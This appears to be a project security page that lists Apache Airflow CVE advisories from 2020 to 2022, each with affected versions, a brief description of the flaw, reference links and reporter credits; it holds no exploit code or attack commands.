## Apache Airflow Spark Provider RCE that bypass restrictions to read arbitrary files ## { #CVE-2022-40954 }

CVE-2022-40954 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40954) [\[CVE json\]](./CVE-2022-40954.cve.json) [\[OSV json\]](./CVE-2022-40954.osv.json)



_Last updated: 2022-11-22T09:40:32.614Z_

### Affected

* Apache Airflow Spark Provider from unspecified before 4.0.0
* Apache Airflow from unspecified before 2.3.0


### Description

Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Spark Provider, Apache Airflow allows an attacker to read arbtrary files in the task execution context, without write access to DAG files. This issue affects Spark Provider versions prior to 4.0.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case Spark Provider is installed (Spark Provider 4.0.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the Spark Provider version 4.0.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version that has lower version of the Spark Provider installed).

### References
* https://github.com/apache/airflow/pull/27646
* https://lists.apache.org/thread/0tmdlnmjs5t4gsx5fy73tb6zd3jztq45


### Credits
* Apache Airflow PMC wants to thank id_No2015429 of 3H Security Team for reporting the issue.


## Open Redirect ## { #CVE-2022-40754 }

CVE-2022-40754 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40754) [\[CVE json\]](./CVE-2022-40754.cve.json) [\[OSV json\]](./CVE-2022-40754.osv.json)



_Last updated: 2022-09-21T07:22:31.671Z_

### Affected

* Apache Airflow from unspecified before 2.4.0


### Description

In Apache Airflow 2.3.0 through 2.3.4, there was an open redirect in the webserver's `/confirm` endpoint.

### References
* https://github.com/apache/airflow/pull/26409
* https://lists.apache.org/thread/cn098dcp5x3c402xrb06p3l7nz5goffm


### Credits
* The Apache Airflow PMC would like to thank Konstantin Weddige (Lutra Security) for reporting this issue.


## Format String Vulnerability ## { #CVE-2022-40604 }

CVE-2022-40604 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40604) [\[CVE json\]](./CVE-2022-40604.cve.json) [\[OSV json\]](./CVE-2022-40604.osv.json)



_Last updated: 2022-09-21T07:22:50.780Z_

### Affected

* Apache Airflow from unspecified before 2.4.0


### Description

In Apache Airflow 2.3.0 through 2.3.4, part of a url was unnecessarily formatted, allowing for possible information extraction.

### References
* https://github.com/apache/airflow/pull/26337
* https://lists.apache.org/thread/z20x8m16fnhxdkoollv53w1ybsts687t


### Credits
* The Apache Airflow PMC would like to thank L3yx of Syclover Security Team for reporting this issue.


## Apache Airlfow Pig Provider RCE ## { #CVE-2022-40189 }

CVE-2022-40189 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40189) [\[CVE json\]](./CVE-2022-40189.cve.json) [\[OSV json\]](./CVE-2022-40189.osv.json)



_Last updated: 2022-11-22T09:39:35.331Z_

### Affected

* Apache Airlfow Pig Provider from unspecified before 4.0.0
* Apache Airflow  from unspecified before 2.3.0


### Description

Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Pig Provider, Apache Airflow allows an attacker to control commands executed in the task execution context, without write access to DAG files. This issue affects Pig Provider versions prior to 4.0.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case Pig Provider is installed (Pig Provider 4.0.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the Pig Provider version 4.0.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version.

### References
* https://github.com/apache/airflow/pull/27644
* https://lists.apache.org/thread/yxnfzfw2w9pj5s785k3rlyly4y44sd15


### Credits
* Apache Airflow PMC wants to thank id_No2015429 of 3H Security Team for reporting the issue.


## Apache Airflow <2.4.0 has an RCE in a bash example ## { #CVE-2022-40127 }

CVE-2022-40127 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40127) [\[CVE json\]](./CVE-2022-40127.cve.json) [\[OSV json\]](./CVE-2022-40127.osv.json)



_Last updated: 2022-11-14T09:30:08.330Z_

### Affected

* Apache Airflow from Apache Airflow before 2.4.0


### Description

A vulnerability in Example Dags of Apache Airflow allows an attacker with UI access who can trigger DAGs, to execute arbitrary commands via manually provided run_id parameter.  This issue affects Apache Airflow Apache Airflow versions prior to 2.4.0.

### References
* https://github.com/apache/airflow/pull/25960
* https://lists.apache.org/thread/cf132hgm6jvzvsbpsozl3plf1r4cwysy


### Credits
* Apache Airflow PMC would like to thank L3yx of Syclover Security Team.


## Apache Airflow Pinot provider allowed Command Injection ## { #CVE-2022-38649 }

CVE-2022-38649 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-38649) [\[CVE json\]](./CVE-2022-38649.cve.json) [\[OSV json\]](./CVE-2022-38649.osv.json)



_Last updated: 2022-11-22T09:35:10.175Z_

### Affected

* Apache Airflow Pinot Provider from unspecified before 4.0.0
* Apache Airflow from unspecified before 2.3.0


### Description

Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Pinot Provider, Apache Airflow allows an attacker to control commands executed in the task execution context, without write access to DAG files. This issue affects Apache Airflow Pinot Provider versions prior to 4.0.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case Apache Airflow Pinot Provider is installed (Apache Airflow Pinot Provider 4.0.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the Pinot Provider version 4.0.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version.

### References
* https://github.com/apache/airflow/pull/27641
* https://lists.apache.org/thread/033o1gbc4ly6dpd2xf1o201v56fbl4dz


### Credits
* Apache Airflow PMC wants to thank id_No2015429 of 3H Security Team for reporting the issue.


## Docker Provider <3.0 RCE vulnerability in example dag ## { #CVE-2022-38362 }

CVE-2022-38362 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-38362) [\[CVE json\]](./CVE-2022-38362.cve.json) [\[OSV json\]](./CVE-2022-38362.osv.json)



_Last updated: 2022-08-16T14:05:03.199Z_

### Affected

* Apache Airflow from Apache Airflow Docker Provider before 3.0.0


### Description

Apache Airflow Docker's Provider prior to 3.0.0 shipped with an example DAG that was vulnerable to (authenticated) remote code exploit of code on the Airflow worker host.


### References
* https://lists.apache.org/thread/614p38nf4gbk8xhvnskj9b1sqo2dknkb


### Credits
* Thanks to Kai Zhao of 3H Secruity Team for reporting this


## Overly permissive umask for daemons ## { #CVE-2022-38170 }

CVE-2022-38170 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-38170) [\[CVE json\]](./CVE-2022-38170.cve.json) [\[OSV json\]](./CVE-2022-38170.osv.json)



_Last updated: 2022-09-02T07:07:24.352Z_

### Affected

* Apache Airflow from Apache Airflow through 2.3.3


### Description

In Apache Airflow prior to 2.3.4, an insecure umask was configured for numerous Airflow components when running with the  `--daemon` flag which could result in a race condition giving world-writable files in the Airflow home directory and allowing local users to expose arbitrary file contents via the webserver.

### References
* https://lists.apache.org/thread/zn8mbbb1j2od5nc9zhrvb7rpsrg1vvzv


### Credits
* The Apache Airflow PMC would like to thank Harry Sintonen for reporting this issue.


## Session Fixation ## { #CVE-2022-38054 }

CVE-2022-38054 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-38054) [\[CVE json\]](./CVE-2022-38054.cve.json) [\[OSV json\]](./CVE-2022-38054.osv.json)



_Last updated: 2022-09-13T08:39:38.357Z_

### Affected

* Apache Airflow from 2.2.4 before Apache Airflow*


### Description

In Apache Airflow versions 2.2.4 through 2.3.3, the `database` webserver session backend was susceptible to session fixation.

### References
* https://lists.apache.org/thread/rsd3h89xdp16rg0ltovx3m7q3ypkxsbb


### Credits
* The Apache Airflow PMC would like to thank Kai Zhao for reporting this issue.
* Additoinally we would like to thank Ali Al-Habsi for independently discovering and reporting this issue.


## Apache Airflow prior to 2.3.1 may include sensitive values in rendered template ## { #CVE-2022-27949 }

CVE-2022-27949 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-27949) [\[CVE json\]](./CVE-2022-27949.cve.json) [\[OSV json\]](./CVE-2022-27949.osv.json)



_Last updated: 2022-11-15T11:12:08.938Z_

### Affected

* Apache Airflow from unspecified before 2.3.1


### Description

A vulnerability in UI of Apache Airflow allows an attacker to view unmasked secrets in rendered template values for tasks which were not executed (for example when they were depending on past and previous instances of the task failed). This issue affects Apache Airflow prior to 2.3.1.

### References
* https://github.com/apache/airflow/pull/22754
* https://lists.apache.org/thread/n38oc5obb48600fsvnbopxcs0jpbp65p


### Credits
* Apache Airflow PMC would like to thank James Srinivasan for reporting it.


## Apache Airflow: RCE in example DAGs ## { #CVE-2022-24288 }

CVE-2022-24288 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-24288) [\[CVE json\]](./CVE-2022-24288.cve.json) [\[OSV json\]](./CVE-2022-24288.osv.json)



_Last updated: 2022-02-25T08:21:43.680Z_

### Affected

* Apache Airflow from unspecified before 2.2.4


### Description

In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.

### References
* https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t


### Credits
* The Apache Airflow PMC would like to thank Kai Zhao of the TToU Security Team for reporting this issue.


## Apache Airflow: Creating DagRuns didn't respect Dag-level permissions in the Webserver ## { #CVE-2021-45230 }

CVE-2021-45230 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-45230) [\[CVE json\]](./CVE-2021-45230.cve.json) [\[OSV json\]](./CVE-2021-45230.osv.json)



_Last updated: 2022-01-20T09:06:03.334Z_

### Affected

* Apache Airflow at Apache Airflow 1.10 1.10.0 to 1.10.15
* Apache Airflow from Apache Airflow 2 before 2.2.0


### Description

In Apache Airflow prior to 2.2.0.  This CVE applies to a specific case where a User who has "can_create" permissions on DAG Runs can create Dag Runs for dags that they don't have "edit" permissions for. 



### References
* https://lists.apache.org/thread/m778ojn0k595rwco4ht9wjql89mjoxnl


### Credits
* Apache Airflow PMC would like to thank Franco Cano Erazo for reporting this issue.


## Apache Airflow: Reflected XSS via Origin Query Argument in URL ## { #CVE-2021-45229 }

CVE-2021-45229 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-45229) [\[CVE json\]](./CVE-2021-45229.cve.json) [\[OSV json\]](./CVE-2021-45229.osv.json)



_Last updated: 2022-02-25T08:21:17.026Z_

### Affected

* Apache Airflow from unspecified before 2.2.4


### Description

It was discovered that the "Trigger DAG with config" screen was susceptible to XSS attacks via the `origin` query argument.

This issue affects Apache Airflow versions 2.2.3 and below. 

### References
* https://lists.apache.org/thread/phx76cgtmhwwdy780rvwhobx8qoy4bnk


### Credits
* The Apache Airflow PMC would like to thank both Bogdan Kurinnoy of the Samsung R&D Institute Ukraine (SRK) and Ali Al-Habsi of Accellion for independently discovering and reporting this issue.


## Apache Airflow: Variable Import endpoint missed authentication check ## { #CVE-2021-38540 }

CVE-2021-38540 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-38540) [\[CVE json\]](./CVE-2021-38540.cve.json) [\[OSV json\]](./CVE-2021-38540.osv.json)



_Last updated: 2021-09-09T14:59:44.637Z_

### Affected

* Apache Airflow from Apache Airflow  before 2.1.3


### Description

The variable import endpoint was not protected by authentication in Airflow >=2.0.0, <2.1.3. This allowed unauthenticated users to hit that endpoint to add/modify Airflow variables used in DAGs, potentially
resulting in a denial of service, information disclosure or remote code execution.

This issue affects Apache Airflow >=2.0.0, <2.1.3.

### References
* https://lists.apache.org/thread.html/rb34c3dd1a815456355217eef34060789f771b6f77c3a3dec77de2064%40%3Cusers.airflow.apache.org%3E


### Credits
* Apache Airflow would like to thank Nathan Jones, National Australia Bank’s Offensive Security Team


## No Authentication on Logging Server ## { #CVE-2021-35936 }

CVE-2021-35936 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-35936) [\[CVE json\]](./CVE-2021-35936.cve.json) [\[OSV json\]](./CVE-2021-35936.osv.json)



_Last updated: 2021-08-16T07:22:38.757Z_

### Affected

* Apache Airflow from Apache Airflow before 2.1.2


### Description

If remote logging is not used, the worker (in the case of CeleryExecutor) or the scheduler (in the case of LocalExecutor) runs a Flask logging server and is listening on a specific port and also binds on 0.0.0.0 by default.
This logging server had no authentication and allows reading log files of DAG jobs.

This issue affects Apache Airflow < 2.1.2.

### References
* https://lists.apache.org/thread.html/r53d6bd7b0a66f92ddaf1313282f10fec802e71246606dd30c16536df%40%3Cusers.airflow.apache.org%3E


### Credits
* Apache Airflow would like to thank Dolev Farhi for reporting this issue.


## Apache Airflow Reflected XSS via Origin Query Argument in URL ## { #CVE-2021-28359 }

CVE-2021-28359 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-28359) [\[CVE json\]](./CVE-2021-28359.cve.json) [\[OSV json\]](./CVE-2021-28359.osv.json)



_Last updated: 2021-05-02T07:52:16.051Z_

### Affected

* Apache Airflow at 2.0.0
* Apache Airflow at 2.0.1
* Apache Airflow from Apache Airflow before 1.10.15


### Description

The "origin" parameter passed to some of the endpoints like '/trigger' was vulnerable to XSS exploit. This issue affects Apache Airflow versions <1.10.15 in 1.x series and affects 2.0.0 and 2.0.1 and 2.x series.

This is the same as CVE-2020-13944 & CVE-2020-17515 but the implemented fix did not fix the issue completely. Update to Airflow 1.10.15 or 2.0.2.

Please also update your Python version to the latest available PATCH releases of the installed MINOR versions, example update to Python 3.6.13 if you are on Python 3.6. (Those contain the fix for CVE-2021-23336 https://nvd.nist.gov/vuln/detail/CVE-2021-23336).

### References
* https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E


### Credits
* Vasileios Daskalakis


## Apache Airflow: Lineage API endpoint for Experimental API missed authentication check ## { #CVE-2021-26697 }

CVE-2021-26697 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-26697) [\[CVE json\]](./CVE-2021-26697.cve.json) [\[OSV json\]](./CVE-2021-26697.osv.json)



_Last updated: 2021-02-17T14:10:43.736Z_

### Affected

* Apache Airflow at 2.0.0


### Description

The lineage endpoint of the deprecated Experimental API was not protected by authentication in Airflow 2.0.0. This allowed unauthenticated users to hit that endpoint.

This is low-severity issue as the attacker needs to be aware of certain parameters to pass to that endpoint and even after can just get some metadata about a DAG and a Task.

This issue affects Apache Airflow 2.0.0.

### References
* https://lists.apache.org/thread.html/re21fec81baea7a6d73b0b5d31efd07cc02c61f832e297f65bb19b519%40%3Cusers.airflow.apache.org%3E


### Credits
* Apache Airflow would like to thank Ian Carroll for reporting this issue.


## CWE-284 Improper Access Control on Configurations Endpoint for the Stable API ## { #CVE-2021-26559 }

CVE-2021-26559 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-26559) [\[CVE json\]](./CVE-2021-26559.cve.json) [\[OSV json\]](./CVE-2021-26559.osv.json)



_Last updated: 2021-02-17T13:18:02.283Z_

### Affected

* Apache Airflow at 2.0.0


### Description

Improper Access Control on Configurations Endpoint for the Stable API of Apache Airflow allows users with Viewer or User role to get Airflow Configurations including sensitive information even when `[webserver] expose_config` is set to `False` in `airflow.cfg`. 

This allowed a privilege escalation attack.

This issue affects Apache Airflow 2.0.0.

### References
* https://lists.apache.org/thread.html/r3b3787700279ec361308cbefb7c2cce2acb26891a12ce864e4a13c8d%40%3Cusers.airflow.apache.org%3E


### Credits
* Apache Airflow would like to thank Ian Carroll for reporting this issue.


##  ## { #CVE-2020-17526 }

CVE-2020-17526 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2020-17526) [\[CVE json\]](./CVE-2020-17526.cve.json) [\[OSV json\]](./CVE-2020-17526.osv.json)



_Last updated: 2020-12-21T16:43:50.352Z_

### Affected

* Apache Airflow from Apache Airflow before 1.10.14


### Description

Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from Site A.  This does not affect users who have changed the default value for `[webserver] secret_key` config.

### References
* https://lists.apache.org/thread.html/rbeeb73a6c741f2f9200d83b9c2220610da314810c4e8c9cf881d47ef%40%3Cusers.airflow.apache.org%3E


### Credits
* Junghan Lee of Deliveryhero Korea Security Team


##  ## { #CVE-2020-17515 }

CVE-2020-17515 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2020-17515) [\[CVE json\]](./CVE-2020-17515.cve.json) [\[OSV json\]](./CVE-2020-17515.osv.json)



_Last updated: 2020-12-11T13:35:28.574Z_

### Affected

* Apache Airflow from Apache Airflow before 1.10.13


### Description

The "origin" parameter passed to some of the endpoints like '/trigger' was vulnerable to XSS exploit. This issue affects Apache Airflow versions prior to 1.10.13.

This is same as CVE-2020-13944 but the implemented fix in Airflow 1.10.13 did not fix the issue completely.

### References
* https://lists.apache.org/thread.html/r4656959c8ed06c1f6202d89aa4e67b35ad7bdba5a666caff3fea888e%40%3Cusers.airflow.apache.org%3E


### Credits
* Ali Abdulwahab Ali Al-habsi of Accellion


##  ## { #CVE-2020-17513 }

CVE-2020-17513 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2020-17513) [\[CVE json\]](./CVE-2020-17513.cve.json) [\[OSV json\]](./CVE-2020-17513.osv.json)



_Last updated: 2020-12-14T09:36:02.746Z_

### Affected

* Apache Airflow from Apache Airflow before 1.10.13


### Description

In Apache Airflow versions prior to 1.10.13, the Charts and Query View of the old (Flask-admin based) UI were vulnerable for SSRF attack.

### References
* https://lists.apache.org/thread.html/rb3647269f07cc2775ca6568cbfd4994d862c842a58120d2aba9c658a%40%3Cusers.airflow.apache.org%3E


##  ## { #CVE-2020-17511 }

CVE-2020-17511 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2020-17511) [\[CVE json\]](./CVE-2020-17511.cve.json) [\[OSV json\]](./CVE-2020-17511.osv.json)



_Last updated: 2020-12-14T09:35:45.373Z_

### Affected

* Apache Airflow from Apache Airflow before 1.10.13


### Description

In Airflow versions prior to 1.10.13, when creating a user using airflow CLI, the password gets logged in plain text in the Log table in Airflow Metadatase. Same happened when creating a Connection with a password field.


### References
* https://lists.apache.org/thread.html/ree782a29d927b96bf0b39fb92e2f1f09ea3112a985f7a08ce93765ac%40%3Cusers.airflow.apache.org%3E


### Credits
* Ali Al-Habsi of Accellion
